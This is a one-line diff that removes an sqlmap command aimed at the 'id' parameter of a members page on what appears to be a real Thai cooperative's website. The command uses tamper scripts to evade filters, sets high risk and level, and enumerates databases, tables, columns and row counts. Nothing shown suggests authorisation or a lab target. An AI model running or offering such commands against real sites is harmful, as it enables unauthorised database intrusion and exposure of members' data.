@@ -1,1 +1,0 @@
-https://peacoop.or.th/members?id=1 (GET)  # C:\Users\Administrator\AppData\Local\Programs\Python\Python311\Scripts\sqlmap -u https://peacoop.or.th/members?id=1 -p id --batch --random-agent --tamper=space2comment,randomcase --level=3 --risk=3 --threads=5 --count --tables --dbs --columns --output-dir=sqlmap_output/PEACOOP_structure
